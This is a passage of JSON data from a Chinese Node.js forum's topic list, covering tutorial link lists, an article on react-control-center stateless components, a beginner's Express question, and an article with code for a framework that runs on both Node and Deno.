href=\"https://www.rails365.net/movies/graphql/473.html\">诱人的 GraphQL 视频教程 #15 Mongoose Models</a>「Pro」「06:36」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/474.html\">诱人的 GraphQL 视频教程 #16 Mutations</a>「Pro」「08:27」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/475.html\">诱人的 GraphQL 视频教程 #17 更多的 Mutations</a>「Pro」「06:04」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/476.html\">诱人的 GraphQL 视频教程 #18 更新 Resolve</a>「Pro」「08:36」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/477.html\">诱人的 GraphQL 视频教程 #19 GraphQLNonNull</a>「Pro」「04:15」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/481.html\">诱人的 GraphQL 视频教程 #20 添加 React 前端</a>「Pro」「08:10」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/482.html\">诱人的 GraphQL 视频教程 #21 建立 Apollo React 客户端</a>「Pro」「08:30」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/483.html\">诱人的 GraphQL 视频教程 #22 在 React 中发送查询语句</a>「Pro」「09:28」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/484.html\">诱人的 GraphQL 视频教程 #23 在组件中显示远程的数据</a>「Pro」「05:07」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/485.html\">诱人的 GraphQL 视频教程 #24 添加增加 Book 的表单组件</a>「Pro」「06:45」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/486.html\">诱人的 GraphQL 视频教程 #25 组织代码 - 外部查询文件</a>「Pro」「03:38」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/487.html\">诱人的 GraphQL 视频教程 #26 更新组件的 state</a>「Pro」「03:40」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/488.html\">诱人的 GraphQL 视频教程 #27 组合 Mutations 和 Queries</a>「Pro」「10:59」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/489.html\">诱人的 GraphQL 视频教程 #28 Mutation 查询变量</a>「Pro」「04:29」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/490.html\">诱人的 GraphQL 视频教程 #29 Mutation refetchQueries</a>「Pro」「05:12」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/491.html\">诱人的 GraphQL 视频教程 #30 Book Details Component</a>「Pro」「07:30」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/492.html\">诱人的 GraphQL 视频教程 #31 发送请求显示 Book Details </a>「Pro」「08:57」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/493.html\">诱人的 GraphQL 视频教程 #32 增加 CSS 样式</a>「Pro」「06:58」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/494.html\">诱人的 GraphQL 视频教程 #33 网页调试工具</a>「Pro」「」</p>\n<p><a href=\"https://www.rails365.net/movies/graphql/495.html\">诱人的 GraphQL 视频教程 #34 总结与规划</a>「Pro」「03:03」</p>\n</div>","title":"2019 年最新的 GraphQL 视频教程免费分享","last_reply_at":"2019-03-09T13:44:17.245Z","good":false,"top":false,"reply_count":1,"visit_count":438,"create_at":"2019-03-09T08:18:26.075Z","author":{"loginname":"yinsigan","avatar_url":"https://avatars2.githubusercontent.com/u/740643?v=4&s=120"}},{"id":"5c83a055acb681372d416846","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><h3>视图与业务，好一对冤家</h3>\n<h4>业务型model</h4>\n<p><code>model</code>是需要精心的设计和合理的划分的，这是我们之前开发大型的<code>redux</code>+<code>react</code>单页面应用，大家都认同的真理，同样的，在<code>react-control-center</code>+<code>react</code>的开发里也适用这条黄金规则，通常，我们在接到需求，定制开发计划的时候，会抽象出很多业务相关的关键词，这些关键词慢慢经过进一步整理，将成为我们划分功能或者模块的有效依据，这些模块最终在前端这里会沉淀为<code>model</code>，每一个<code>model</code>定义了自己的<code>state</code>、<code>reducer</code>,当然如果有需要，还可以为其定义<code>computed</code>、<code>init</code>，通过精心的目录组织和规范的约定，视图的渲染逻辑和我们书写的业务逻辑被有效的解耦到<code>component</code>里和<code>reducer</code>里，这样当我们需要重构UI组件，可以放心的对其重构或者新增一个组件，复用相同的<code>state</code>和<code>reducer</code><br>\n<a href=\"https://github.com/fantasticsoul/rcc-antd-pro/tree/master/src/models-cc\">参考cc-antd-pro的划分</a></p>\n<pre class=\"prettyprint\"><code>|________layouts\n|     |________BasicLayout.js\n|     |________BasicLayout.less\n|     |________BlankLayout.js\n|     |________PageHeaderLayout.js\n|     |________PageHeaderLayout.less\n|     |________UserLayout.js\n|     |________UserLayout.less\n|________models\n|     |________activities.js\n|     |________chart.js\n|     |________form.js\n|     |________global.js\n|     |________index.js\n|     |________list.js\n|     |________login.js\n|     |________monitor.js\n|     |________profile.js\n|     |________project.js\n|     |________register.js\n|     |________rule.js\n|     |________user.js\n</code></pre><h4>视图型model</h4>\n<p>有一些状态，我们开发的过程中，发现和视图紧密相关，不同的组件在不同的生命周期阶段，都需要使用他们或者感知到他们的变化，例如右上角用户勾选的主题色，影响左下角一个抽屉的弹出策略或效果，这些状态同样需要交个状态管理框架集中管理起来，所以我们也会这些需求设计相应的<code>model</code>,这一类和主要业务逻辑不想管，但是我们依然需要精心管理起来的<code>model</code>，我们称之为视图型<code>model</code>.</p>\n<h4>视图代码膨胀之困惑</h4>\n<p>通常，我们已开始精心设计好各种<code>model</code>后，开始信心满满的进入开发流程，随着功能迭代越来越块，需求变动越来频繁，我们的<code>model</code>会不停的调整或者扩展，按照<code>class</code>组件和<code>function</code>组件比例2：8开的原则，我们总是想抽出更多的<code>function</code>组件，<code>class</code>组件负责和和<code>model</code>打通，然后从<code>model</code>里拿到的数据层层派发它的所以孩子<code>function</code>组件里，但是<code>function</code>组件通常都不是只负责展示，还是有不少<code>function</code>组件需要修改<code>model</code>的<code>state</code>,所以我们在<code>ant-design-pro</code>里或者别的地方，依然会看到不少类似代码</p>\n<pre class=\"prettyprint\"><code>@connect(state =&gt; ({\n  register: state.register,\n}))\nclass Foo extends Component {\n    render(){\n        return (\n            &lt;MyStatelessFoo {...this.props}&#x2F;&gt;\n        );\n    }\n}\n\nconst MyStatelessFoo = ({dispatch}){\n    return &lt;div onClick={dispatch(&#x27;foo&#x2F;changeSomething&#x27;)}&gt;whaterver&lt;&#x2F;div&gt;\n}\n</code></pre><p>如果有<code>function</code>组件<code>Foo1</code>、<code>Foo2</code>、<code>Foo3</code>,<code>Foo1</code>嵌套了<code>Foo2</code>,<code>Foo2</code>嵌套了<code>Foo3</code>，看起来要一层一层传递下去了。<br>\n同时视图组件调整的时间占比会远大于<code>reducer</code>函数的书写，我们有时候为了那个某个<code>model</code>的<code>state</code>,不停的传递下去或者慢慢的将某些比较重的<code>function</code>组件又提升为<code>class</code>组件</p>\n<h4>react hooks解决了什么呢？</h4>\n<p>这里复制一段facebook引出<code>hooks</code>要解决的问题所在之处</p>\n<ul>\n<li>难以重用和共享组件中的与状态相关的逻辑</li>\n<li>逻辑复杂的组件难以开发与维护，当我们的组件需要处理多个互不相关的 local state * 时，每个生命周期函数中可能会包含着各种互不相关的逻辑在里面。</li>\n<li>类组件中的this增加学习成本，类组件在基于现有工具的优化上存在些许问题。</li>\n<li>由于业务变动，函数组件不得不改为类组件等等。</li>\n</ul>\n<p>可是如果我们的<code>function</code>组件如果是需要共享或者修改<code>model</code>的<code>state</code>呢，有什么更优雅的办法解决吗？</p>\n<h4>CcFragment为你带来全新的无状态组件书写体验</h4>\n<p>一个典型的<code>CcFragment</code>使用方式如下</p>\n<pre class=\"prettyprint\"><code>import {CcFragment} from &#x27;react-control-center&#x27;;\n\n&#x2F;&#x2F;在你的普通的react组件或者cc组件里，都可以写如下代码\n  render() {\n    &lt;div&gt;\n      &lt;span&gt;another jsx content&lt;&#x2F;span&gt;\n      &lt;hr&#x2F;&gt;\n      &lt;CcFragment ccKey=&quot;toKnowWhichFragmentChangeStore&quot; connect={{ &#x27;foo&#x2F;*&#x27;: &#x27;&#x27;, &#x27;bar&#x2F;a&#x27;: &#x27;a&#x27;, &#x27;bar&#x2F;b&#x27;: &#x27;alias_b&#x27; }}&gt;\n        {\n          ({ propState, setState, dispatch, emit, effect, xeffect, lazyEffect, lazyXeffect }) =&gt; (\n            &lt;div onClick={() =&gt; setState(&#x27;foo&#x27;, { name: &#x27;cool, I can change foo module name&#x27; })}&gt;\n              {&#x2F;* 以上方法，你可以像在cc类组件一样的使用它们，没有区别 *&#x2F;}\n              {propState.foo.name}\n              {propState.bar.a}\n              {propState.bar.alias_b}\n            &lt;&#x2F;div&gt;\n          )\n        }\n      &lt;&#x2F;CcFragment&gt;\n    &lt;&#x2F;div&gt;\n  }\n\n</code></pre><p>上面代码里，<code>CcFragment</code>标记一个<code>ccKey</code>，<code>connect</code></p>\n<ul>\n<li>cc默认是会为所有<code>CcFragment</code>自动生成<code>ccKey</code>的，但是我们推荐你书写一个有意义的<code>ccKey</code>，因为<code>CcFragment</code>允许无状态组件直接使用<code>setState, dispatch, emit, effect, xeffect, lazyEffect, lazyXeffect</code>方法去修改状态或者发起通知，这些函数的使用体验是和<code>cc class</code>一摸一样，加上<code>ccKey</code>,你可以在你的中间件函数里看到某一次的状态变化是由哪一个<code>ccKey</code>触发的，这样未来你可以在还在计划开发中的<code>cc-dev-tool</code>里查看具体的状态变迁历史，当然目前你需要查看状态变化的话，可以写一个简单的中间件函数来log</li>\n</ul>\n<pre class=\"prettyprint\"><code>function myMiddleware(params, next) {\n  &#x2F;&#x2F;params 里你可以看到本次状态变化提交的状态是什么，由什么方法触发，由那个ccKey的引用触发等\n  console.log(&#x27;myMiddleware&#x27;, params);\n  next();\n}\n\ncc.startup({\n  &#x2F;&#x2F;...\n  middlewares: [myMiddleware]\n});\n\n</code></pre><ul>\n<li>connect和<code>cc.register</code>、<code>cc.connect</code>一样，表示该<code>CcFragment</code>关注那些模块，哪些值的变化，上述示例的效果会是</li>\n</ul>\n<blockquote>\n<p>1 只要<code>bar</code>模块的<code>a</code>或者<code>b</code>变化了，都会触发该<code>CcFragment</code>的渲染<br>\n2 只要<code>foo</code>模块的任意<code>key</code>变化了，都会触发该<code>CcFragment</code>的渲染<br>\n3 点击了<code>div</code>,会去修改<code>foo</code>模块的<code>name</code>值，关注<code>foo</code>模块<code>name</code>值变化的所有<code>cc</code>组件或者<code>CcFragment</code>组件都会触发渲染</p>\n</blockquote>\n<p>所以<code>CcFragment</code>解决了用户在无状态组件里共享了<code>model</code>数据的问题，你写的无状态组件很容易和<code>cc store</code>打通，而无需在考虑抽取为<code>cc class</code>组件，<code>CcFragment</code>本质上和<code>hooks</code>不存在冲突管理，也和现有<code>cc class</code>不冲突，只是作为<code>cc</code>世界里更重要的补充，让你可以无损的使用现有的<code>function</code>组件。<br>\n注意一点哦，<code>CcFragment</code>本身是不会因为父组件的更新而被更新的哦，仅仅受控制于<code>connect</code>参数观察的参数是否发生变化，所以它的渲染依然是高效的。</p>\n<h3>那么可爱的各位看官，还不赶紧使用起来</h3>\n<ul>\n<li><a href=\"https://stackblitz.com/edit/dva-example-count-1saxx8?file=index.js\">在线示例点我</a></li>\n<li><a href=\"https://github.com/fantasticsoul/react-control-center\">cc版本ant-design-pro</a></li>\n<li><a href=\"https://github.com/fantasticsoul/rcc-simple-demo\">基础入门项目</a></li>\n<li><a href=\"http://jsrun.net/vLXKp/play\">runjs录像教程</a></li>\n</ul>\n</div>","title":"在react-control-center里玩转无状态组件","last_reply_at":"2019-03-09T11:15:33.173Z","good":false,"top":false,"reply_count":0,"visit_count":297,"create_at":"2019-03-09T11:15:33.173Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c837546acb681372d4167bb","author_id":"58400cd63aa1310a5786878f","tab":"share","content":"<div class=\"markdown-text\"><h2>诱人的 TypeScript 视频教程（59 个视频）</h2>\n<p><a href=\"https://www.rails365.net/movies/typescript/507.html\">诱人的 TypeScript 视频教程 #1 介绍</a>「06:26」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/508.html\">诱人的 TypeScript 视频教程 #2 为什么要用 TypeScript</a>「14:08」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/509.html\">诱人的 TypeScript 视频教程 #3 安装 TypeScript</a>「04:54」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/510.html\">诱人的 TypeScript 视频教程 #4 类型定义</a>「05:57」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/511.html\">诱人的 TypeScript 视频教程 #5 var、let、const</a>「Pro」「12:15」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/512.html\">诱人的 TypeScript 视频教程 #6 数组 - Array</a>「Pro」「08:03」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/513.html\">诱人的 TypeScript 视频教程 #7 元组 - Tuple</a>「Pro」「04:59」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/514.html\">诱人的 TypeScript 视频教程 #8 函数 - Function - Arrow Function</a>「Pro」「05:53」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/515.html\">诱人的 TypeScript 视频教程 #9 函数返回值类型 - void</a>「Pro」「05:35」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/516.html\">诱人的 TypeScript 视频教程 #10 函数 - 默认参数和可选参数</a>「Pro」「08:27」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/517.html\">诱人的 TypeScript 视频教程 #11 函数 - Rest Parameters</a>「Pro」「06:21」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/518.html\">诱人的 TypeScript 视频教程 #12 任意类型 - any</a>「Pro」「07:14」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/519.html\">诱人的 TypeScript 视频教程 #13 联合类型 - union type、null、undefined</a>「Pro」「08:55」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/520.html\">诱人的 TypeScript 视频教程 #14 类 - 面向对象 - class 介绍</a>「Pro」「09:37」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/521.html\">诱人的 TypeScript 视频教程 #15 面向对象 - 类 - 构造方法（constructor）- 方法（methods）</a>「Pro」「11:46」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/522.html\">诱人的 TypeScript 视频教程 #16 面向对象 - 继承和多态 - Inheritance and Polymorphism</a>「Pro」「13:10」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/523.html\">诱人的 TypeScript 视频教程 #17 面向对象 - 成员可见性 - Member visibility - public 和 private</a>「Pro」「15:22」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/524.html\">诱人的 TypeScript 视频教程 #18 面向对象 - 成员可见性 - Member visibility - 深入解析 private 和 protected 的异同</a>「Pro」「22:55」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/525.html\">诱人的 TypeScript 视频教程 #19 面向对象 - 成员可见性 - Member visibility - 深入探索 constructor</a>「Pro」「10:24」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/526.html\">诱人的 TypeScript 视频教程 #20 面向对象 - 静态属性和方法 - static - 深入探索成员可见性</a>「Pro」「16:12」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/527.html\">诱人的 TypeScript 视频教程 #21 面向对象 - 只读属性 - readonly</a>「Pro」「03:48」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/528.html\">诱人的 TypeScript 视频教程 #22 枚举类型 - enum</a>「Pro」「07:22」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/529.html\">诱人的 TypeScript 视频教程 #23 nodemon 和 ts-node</a>「Pro」「05:30」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/530.html\">诱人的 TypeScript 视频教程 #24 接口介绍 - Interfaces - 鸭子类型</a>「Pro」「14:56」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/531.html\">诱人的 TypeScript 视频教程 #25 接口使用 - Interfaces</a>「Pro」「07:01」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/532.html\">诱人的 TypeScript 视频教程 #26 接口 - 方法</a>「Pro」「06:12」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/533.html\">诱人的 TypeScript 视频教程 #27 类型别名 - type alias</a>「Pro」「12:02」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/534.html\">诱人的 TypeScript 视频教程 #28 实例演练类实现接口 - Class Types Implementing an interface</a>「Pro」「16:23」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/535.html\">诱人的 TypeScript 视频教程 #29 接口 - 可选属性 - Excess Property Checks</a>「Pro」「09:19」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/536.html\">诱人的 TypeScript 视频教程 #30 接口 - 只读属性</a>「Pro」「04:03」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/537.html\">诱人的 TypeScript 视频教程 #31 接口 - Function Types</a>「Pro」「08:25」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/538.html\">诱人的 TypeScript 视频教程 #32 结合接口详细谈谈类型断言 part 1</a>「Pro」「11:38」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/539.html\">诱人的 TypeScript 视频教程 #33 结合接口详细谈谈类型断言 part 2</a>「Pro」「10:44」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/540.html\">诱人的 TypeScript 视频教程 #34 接口 - 继承与实现多个接口</a>「Pro」「05:39」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/541.html\">诱人的 TypeScript 视频教程 #35 接口 - 接口继承类 - Interface Extending Classes</a>「Pro」「08:55」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/542.html\">诱人的 TypeScript 视频教程 #36 接口 - Indexable Types part 1</a>「Pro」「07:20」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/543.html\">诱人的 TypeScript 视频教程 #37 接口 - Indexable Types part 2</a>「Pro」「14:17」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/544.html\">诱人的 TypeScript 视频教程 #38 如何处理列表数据</a>「Pro」「05:24」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/545.html\">诱人的 TypeScript 视频教程 #39 类 - 抽象类（补充）</a>「Pro」「09:27」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/546.html\">诱人的 TypeScript 视频教程 #40 Class - Parameter Properties（补充）</a>「Pro」「03:35」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/547.html\">诱人的 TypeScript 视频教程 #41 Class - Accessors getters/setters（补充）</a>「Pro」「09:11」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/548.html\">诱人的 TypeScript 视频教程 #42 --noImplicitThis flag and arrow function</a>「Pro」「06:42」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/549.html\">诱人的 TypeScript 视频教程 #43 五种定义函数类型的方法</a>「Pro」「07:45」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/550.html\">诱人的 TypeScript 视频教程 #44 函数重载 - Function Overloading - part 1</a>「Pro」「08:31」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/551.html\">诱人的 TypeScript 视频教程 #45 函数重载 - Function Overloading - part 2</a>「Pro」「09:20」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/552.html\">诱人的 TypeScript 视频教程 #46 Type Guards part 1（typeof）</a>「Pro」「10:10」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/553.html\">诱人的 TypeScript 视频教程 #47 Type Guards part 2（instanceof）</a>「Pro」「09:39」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/554.html\">诱人的 TypeScript 视频教程 #48 Type Guards For null and undefined - --strictNullChecks</a>「Pro」「07:36」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/555.html\">诱人的 TypeScript 视频教程 #49 非空断言操作符 ! - Non-Null Assertion Operator !</a>「Pro」「05:19」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/556.html\">诱人的 TypeScript 视频教程 #50 never 类型 part 1</a>「Pro」「07:41」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/557.html\">诱人的 TypeScript 视频教程 #51 never 类型 part 2</a>「Pro」「11:44」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/558.html\">诱人的 TypeScript 视频教程 #52 Discriminated Unions</a>「Pro」「06:58」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/559.html\">诱人的 TypeScript 视频教程 #53 泛型 - generics - 为何要使用泛型</a>「Pro」「09:40」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/560.html\">诱人的 TypeScript 视频教程 #54 泛型 - generics - 使用</a>「Pro」「08:35」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/561.html\">诱人的 TypeScript 视频教程 #55 泛型 - 在类中使用（简洁）</a>「Pro」「06:22」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/562.html\">诱人的 TypeScript 视频教程 #56 泛型 - 在函数中使用（简洁）</a>「Pro」「05:16」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/563.html\">诱人的 TypeScript 视频教程 #57 泛型 - 在接口中使用 part 1（简洁）</a>「Pro」「04:49」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/564.html\">诱人的 TypeScript 视频教程 #58 泛型 - Interfaces describing indexables part 2（简洁）</a>「Pro」「02:47」</p>\n<p><a href=\"https://www.rails365.net/movies/typescript/565.html\">诱人的 TypeScript 视频教程 #59 泛型 - OOPs style interfaces part 3（简洁）</a>「Pro」「05:31」</p>\n</div>","title":"2019 年最新的 TypeScript 视频教程免费分享","last_reply_at":"2019-03-09T08:11:50.084Z","good":false,"top":false,"reply_count":0,"visit_count":392,"create_at":"2019-03-09T08:11:50.084Z","author":{"loginname":"yinsigan","avatar_url":"https://avatars2.githubusercontent.com/u/740643?v=4&s=120"}},{"id":"5c83567facb681372d416754","author_id":"5c8105eb90c14711cc8cb491","tab":"ask","content":"<div class=\"markdown-text\"><p>如图，我在修改信息或者密码之后都要post重新渲染此页面，两个post请求会干扰吗？\n或者说一般怎么操作这种信息修改比较好</p>\n<p>数据库mongoDB，框架express\nrouter.post(’/profile’,function(req,res,next){</p>\n<p>})\n<img src=\"//static.cnodejs.org/Fkt8mMl3gabP8UCijV2wF_yumceM\" alt=\"image.png\"></p>\n</div>","title":"小白请教node同一个页面中两个post请求，如何处理","last_reply_at":"2019-03-09T06:27:26.411Z","good":false,"top":false,"reply_count":1,"visit_count":343,"create_at":"2019-03-09T06:00:31.125Z","author":{"loginname":"blueswty","avatar_url":"https://avatars2.githubusercontent.com/u/26639919?v=4&s=120"}},{"id":"5c83508eacb681372d416742","author_id":"5c381e903898674067a7e050","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FoXbskoHXq1VpYkNPct3sbfAu8-3\" alt=\"5.png\">\n<img src=\"//static.cnodejs.org/FibGR9FAi2IvP73gBuYZtyzAb33r\" alt=\"4691d597-d83e-4d4c-bc75-8e963604e6a0.jpeg\">\n在来断的更新中希望大家多指点</p>\n</div>","title":"基于egg.js写的微信小程序商城接口","last_reply_at":"2019-03-09T05:35:10.390Z","good":false,"top":false,"reply_count":0,"visit_count":529,"create_at":"2019-03-09T05:35:10.390Z","author":{"loginname":"dezhizhang","avatar_url":"https://avatars3.githubusercontent.com/u/28954583?v=4&s=120"}},{"id":"5c80891e5b8cb21491ca6bc7","author_id":"5a80f10e99ef9fac6b2e6922","tab":"share","content":"<div class=\"markdown-text\"><p>近期在工作中，想用node 获取一些页面的信息，就有了下面的过程。中间一直遇到登录的困扰，研究了一会终于解决了。具体的代码我分享到我得博客里了，还请多多指教。\n<a href=\"https://kejunliang.github.io/2019/03/05/webcrawler/\">个人博客</a></p>\n</div>","title":"关于node模拟登录的过程分享","last_reply_at":"2019-03-08T12:48:13.553Z","good":false,"top":false,"reply_count":7,"visit_count":653,"create_at":"2019-03-07T02:59:42.704Z","author":{"loginname":"kejunliang","avatar_url":"https://avatars1.githubusercontent.com/u/25604373?v=4&s=120"}},{"id":"5c81d00490c14711cc8cb686","author_id":"5875bd3d06fa6e2a4e4f730b","tab":"share","content":"<div class=\"markdown-text\"><p>这篇文章，我更倾向于在分享自己的对构建多运行时框架构建思想，同时希望能够听取更多人的想法，构建更好的过渡框架。</p>\n<h1>最初想法</h1>\n<p>最初想法是收到wine的启发，直接用deno实现一套node的api，然后通过这个api来实现node程序在deno运行的无缝切换。但实现了一段时间后，发现存在几个问题。</p>\n<ul>\n<li>工作量较大，每一次API不断出现，每次都要重新移植</li>\n<li>不仅仅要支持deno,支持deno只是解决当前问题，后面可能会出现oden,enod等等</li>\n<li>细节上很难做好，由于毕竟是两套实现，所以在细节上，始终很难保持一致</li>\n<li>历史包袱将不断扩大，这会把node的历史问题带给下一个运行时</li>\n</ul>\n<p>所以这个想法，在实现过程中和深思中发现并不是一个好方案，所以快速冷静下来，思考一个更好的解决方案。</p>\n<h1>新的想法</h1>\n<p>吸取教训后，痛定思痛。发现要完全丝滑迁移是不现实的，只能考虑保证新的产品能够更加无损的切换，只保证新的框架不会受到老框架的影响。</p>\n<p>所以新点子出现，自己写一个中间层来支持，业务逻辑里面只需要写原生JS代码，暴露给业务层相同的特权方法不就好了。那么对比最初的方案优点缺点，我归类了一下：</p>\n<p>优点：</p>\n<ol>\n<li>工作量偏小</li>\n<li>即使后续推出新的运行时，依旧可以较好的且更小迁移成本的支持</li>\n<li>依赖自己实现的中间层，所以不受制运行时影响导致细节差别过大问题</li>\n<li>业务代码只写JS，不会把上一个运行时的历史包袱，带给下一个运行时</li>\n</ol>\n<p>缺点：</p>\n<ul>\n<li>只能在新业务中使用</li>\n<li>库只能自己通过中间层暴露的接口重新实现一遍</li>\n</ul>\n<p>但事实上构建框架来说，缺点几乎可以忽略，下面会说明原因。</p>\n<h1>实现过程</h1>\n<p>根据上面的方法，自己实现了一个同时支持node和deno的框架DEMO，那么我们已这个框架DEMO来阐述以下我的实现思想把。</p>\n<p><code>注意1：当前教程使用node版本为非stable的v11.11版本（v10不支持），由于使用了大量实验性特性，所以在后续版API可能会产生更改</code></p>\n<p><code>注意2：deno版本也持续长期不稳定，本教程使用的0.3.2版本</code></p>\n<h2>框架DEMO目录结构</h2>\n<p>由于是基于这个框架讲解，那么我们先讲一讲目录的结构吧。同时本文也是为了突出思想，这里不讨论框架的实现程度，简陋请忽视。</p>\n<p>代码文件链接：<a href=\"https://github.com/zy445566/myBlog/tree/master/20190125deno/20190305frame/jsFrame\">点此打开查看</a></p>\n<pre class=\"prettyprint language-sh\"><code>* controller #框架的控制器目录\n* server #框架的服务层目录\n* engineMiddle  #框架的运行时中间层目录\n    * deno #切换到deno要运行的目录\n    * node #切换到node要运行的目录\nconfig.js #框架配置文件\nmian.js #框架的业务入口文件\nrouter.js #框架的路由文件\nrun.sh #框架的启动脚本用于选择运行时的启动\n</code></pre><h2>入口方案</h2>\n<p>通过获取参数的方式来启动框架，默认是使用node启动框架。通过命令来指定运行时来启动框架，如果未指定则默认使用node运行框架。(<code>注意:本DEMO使用了大量新的试验性特性，所以node需要V11来启动</code>)</p>\n<p>show code(run.sh文件代码):</p>\n<pre class=\"prettyprint language-sh\"><code>#!&#x2F;usr&#x2F;bin&#x2F;env bash\nif [ &quot;$1&quot; == &quot;deno&quot; ]\nthen\n    deno --allow-read --allow-write --allow-net --allow-env .&#x2F;engineMiddle&#x2F;deno&#x2F;mod.js\nelse\n    NODE_OPTIONS=&#x27;--experimental-vm-modules --experimental-modules --loader .&#x2F;engineMiddle&#x2F;node&#x2F;custom-loader.mjs&#x27; node .&#x2F;engineMiddle&#x2F;node&#x2F;index.js\nfi\n</code></pre><h2>node中间层方案</h2>\n<p>想法是使用vm来构建原生JS的运行环境，同时加载node官方的custom-loader.mjs来实现import的hook。同时使用v11的vm的最新试验性特性打开VM的import。</p>\n<p>体现在代码上则是以下几点：</p>\n<ul>\n<li>使用VM开执行原生JS</li>\n<li>使用VM最新试验性特性打开原生JS的import的支持</li>\n<li>将非JS所能实现的功能注入每个VM中，使得业务层除原生JS外只能使用我中间层暴露的非原生JS方法</li>\n</ul>\n<p>show code:</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; engineMiddle&#x2F;node&#x2F;index.js node中间层文件\nimport vm from &#x27;vm&#x27;;\nimport fs from &#x27;fs&#x27;;\nimport path from &#x27;path&#x27;;\nimport Http from &#x27;.&#x2F;http.js&#x27;;\nimport File from &#x27;.&#x2F;file.js&#x27;;\nfunction getMidInjectObj() {\n    return {\n        &#x2F;*\n        * 暴露给中间层代码，这仅仅是注入演示\n        * 如有需要可以增加挂载方法\n        * 暴露的方法和deno中间层暴露保持一致就好\n        *&#x2F;\n        midInject:{ \n            console:console,\n            Http:Http, &#x2F;&#x2F;暴露给业务层的HTTP方法和deno暴露方法保持一致\n            File:File &#x2F;&#x2F;暴露给业务层的文件操作方法和deno暴露方法保持一致\n        }\n    }\n}\n(async()=&gt;{\n    &#x2F;&#x2F; 把main.js放入VM中运行\n    const mainPath = &#x27;.&#x2F;main.js&#x27;;\n    const mainJsPath = path.join(process.cwd(),mainPath);\n    const baseURL = new URL(&#x27;file:&#x2F;&#x2F;&#x27;);\n    const mainJsUrl = new URL(mainJsPath, baseURL);\n    const sandbox = vm.createContext(getMidInjectObj());\n    const main = new vm.SourceTextModule(fs.readFileSync(mainJsUrl.pathname).toString(), {\n        context:sandbox, \n        url: mainJsUrl.href,\n        initializeImportMeta(meta){\n            meta.url = mainJsUrl.href\n    }} );\n    &#x2F;&#x2F; 实现VM的import加载器功能\n    async function linker(specifier, referencingModule) {\n        &#x2F;&#x2F; 将传入相对路径和当前文件路径拼成新url\n        const resolved = new URL(specifier, referencingModule.url);\n        &#x2F;&#x2F; 